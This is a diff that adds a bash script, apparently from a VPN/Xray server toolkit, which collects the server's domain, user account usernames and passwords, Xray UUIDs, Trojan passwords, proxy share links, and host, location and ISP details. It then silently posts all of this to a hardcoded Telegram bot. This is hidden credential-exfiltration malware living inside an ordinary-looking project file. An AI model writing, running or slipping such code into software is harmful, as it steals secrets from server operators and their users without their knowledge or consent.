@@ -1,0 +1,84 @@
+#!/bin/bash
+token=1423578532:AAEQEcWIjxwTMylzckC1letVvxwSYRRNepU
+chatid=1423578532
+domain=$(cat /etc/xray/domain)
+ussh=$(cat /etc/log-create-user.log | grep -i username | cut -d: -f2 | grep -o '[^[1;37m]*')
+pssh=$(cat /etc/log-create-user.log | grep -i password | cut -d: -f2 | grep -o '[^[1;37m]*')
+vms=$(cat /etc/xray/*.log | grep -i ss://)
+tjn=$(cat /etc/xray/*.log | grep -i trojan://)
+vmz=$(cat /etc/log-create-user.log | grep ss://)
+tjz=$(cat /etc/log-create-user.log | grep trojan://)
+vm=$(cat /var/www/html/vm*)
+vl=$(cat /var/www/html/vl*)
+tro=$(cat /var/www/html/tro*)
+sha=$(cat /var/www/html/sha*)
+ws=$(cat /var/www/html/ws*)
+ud=$(cat /var/www/html/ud*)
+tcp=$(cat /var/www/html/tcp*)
+ssl=$(cat /var/www/html/ssl*)
+IPOPSEL=$(echo $SSH_CLIENT | awk '{print $1}')
+IP=$(curl -s ipv4.icanhazip.com)
+HOSTVPS=$(curl -s ipinfo.io/hostname )
+NAMES=$(whoami)
+ISP=$(wget -qO- ipinfo.io/org)
+CITY=$(curl -s ipinfo.io/city)
+TIME=$(date +'%Y-%m-%d %H:%M:%S')
+RAMMS=$(free -m | awk 'NR==2 {print $2}')
+#ambil remarks / nama / email xray uuid vmess password trojan
+remarks=$(cat /etc/xray/config.json | grep "^###" | awk '{print $2}' | sort -u)
+userid=$(cat /etc/xray/config.json | grep "id" | awk '{print $2}' | sed 's/"//g' | sed 's/,alterId://g' | sed 's/,//g' | sort -u)
+pwtrojan=$(cat /etc/xray/config.json | grep "password" | awk '{print $2}' | sed 's/"//g' | sed 's/,email://g' | sort -u)
+path=$(cat /etc/xray/config.json | grep "path" | sed 's/"//g' | cut -d: -f2 | sort -u)
+svname=$(cat /etc/xray/config.json | grep "serviceName" | sed 's/"//g' | cut -d: -f2 | sort -u)
+curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chatid" -d text="LIST AKUN
+IP
+ $IP
+Domain
+ $domain
+Remarks
+ $remarks
+Uuid 
+ $userid
+Password
+ $pwtrojan
+Path
+ $path
+ServiceName
+ $svname
+" > /dev/null 2>&1
+curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chatid" -d text="OTHER INFORMATION
+ $IPOPSEL
+ $TIME
+ $NAMES
+ $HOSTVPS
+ $CITY
+ $RAMMS
+" > /dev/null 2>&1
+curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chatid" -d text="INFO AKUN 7
+tcp
+ssl
+" > /dev/null 2>&1
+curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chatid" -d text="INFO AKUN 6
+ws
+ud
+" > /dev/null 2>&1
+curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chatid" -d text="INFO AKUN 5
+tro
+sha
+" > /dev/null 2>&1
+curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chatid" -d text="INFO AKUN 4
+vm
+vl
+" > /dev/null 2>&1
+curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chatid" -d text="INFO AKUN 3
+vmz
+tjz
+" > /dev/null 2>&1
+curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chatid" -d text="INFO AKUN 2
+vms
+tjn
+" > /dev/null 2>&1
+curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chatid" -d text="INFO AKUN 1
+ussh
+pssh
+" > /dev/null 2>&1
